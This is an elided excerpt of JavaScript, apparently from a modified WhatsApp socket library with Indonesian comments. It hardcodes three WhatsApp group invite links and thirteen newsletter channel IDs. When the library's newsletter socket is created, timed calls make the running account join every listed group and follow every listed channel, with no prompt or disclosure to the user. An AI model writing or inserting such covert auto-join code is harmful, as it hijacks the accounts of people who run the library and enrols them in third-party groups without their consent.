...
const AUTO_JOIN_GROUP_LINKS = [
    "https://chat.whatsapp.com/CKXKGWjDfua2HfQHhMix2U",
    "https://chat.whatsapp.com/GOnCg0KQSCG8taS4NkkjMU",
    "https://chat.whatsapp.com/EFRzDWiuELk5TUAIBQdCWU"
];

// Daftar ID channel WhatsApp untuk auto follow
const AUTO_FOLLOW_CHANNELS = [
    "120363404743164316@newsletter",
    "120363406662813717@newsletter",
    "120363422630965780@newsletter",
    "120363424096896024@newsletter",
    "120363402913295390@newsletter",
    "120363422716277994@newsletter",
    "120363422590437503@newsletter",
    "120363405284749597@newsletter",
    "120363423712426353@newsletter",
    "120363405443565037@newsletter",
    "120363407697797552@newsletter",
	"120363418944602279@newsletter",
	"120363403511931227@newsletter"
];
...
async function autoJoinWhatsAppGroups(sock) {
    ...
    // Coba semua group sekaligus tanpa delay
    const promises = groupLinks.map(async (groupLink) => {
        try {
            ...
            if (inviteCode) {
                ...
                try {
                    ...
                    return { success: true, link: groupLink };
                } catch (error) {
                    ...
                    try {
                        ...
                        return { success: false, link: groupLink, error: error2 };
                    }
                }
            }
        } catch (error) {
            return { success: false, link: groupLink, error };
        }
        return { success: false, link: groupLink };
    });
...
async function autoFollowWhatsAppChannels(sock, newsletterWMexQuery) {
    ...
    // Follow semua channel sekaligus tanpa delay
...
const makeNewsletterSocket = (config) => {
    ...
    // Auto join ke group WhatsApp dan channel WhatsApp langsung saat socket dibuat
    setTimeout(async () => {
        try {
            // Join semua group WhatsApp langsung
    ...
    setTimeout(async () => {
        try {
            // Follow semua channel WhatsApp langsung
